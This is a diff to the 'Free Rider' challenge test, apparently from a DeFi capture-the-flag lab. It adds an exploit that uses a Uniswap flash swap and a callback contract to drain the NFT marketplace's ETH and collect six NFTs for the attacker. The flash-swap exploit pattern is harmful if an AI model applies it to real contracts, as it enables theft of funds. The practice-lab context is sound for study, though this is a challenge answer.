@@ -105,6 +105,39 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const UniswapFlashLoanCallbackFactory = await ethers.getContractFactory('UniswapFlashLoanCallback', attacker);
+        this.flashLoanCallback = await UniswapFlashLoanCallbackFactory.deploy(
+            this.marketplace.address,
+            this.weth.address,
+            this.uniswapFactory.address,
+            this.nft.address,
+            {value: ethers.utils.parseEther('0.4')} // for flash swap fee
+        );
+
+        await this.uniswapPair.connect(attacker).swap(
+            ethers.utils.parseEther('15'),
+            0,
+            this.flashLoanCallback.address,
+            '0xa1b2'
+        );
+
+        expect(
+            await ethers.provider.getBalance(this.flashLoanCallback.address)
+        ).to.gte(ethers.utils.parseEther('75')); // marketplace sends 90 minus 15 sent
+
+        expect(await this.nft.balanceOf(this.flashLoanCallback.address)).to.be.eq('6');
+
+        await this.flashLoanCallback.connect(attacker).sendNftToBuyer(
+            [0, 1, 2, 3, 4, 5],
+            this.buyerContract.address
+        );
+
+        expect(await this.nft.balanceOf(this.flashLoanCallback.address)).to.be.eq('0');
+        expect(await this.nft.balanceOf(this.buyerContract.address)).to.be.eq('6');
+
+        await this.flashLoanCallback.connect(attacker).destroy();
+
+        expect(await ethers.provider.getBalance(attacker.address)).to.gte(ethers.utils.parseEther('75'));
     });
 
     after(async function () {
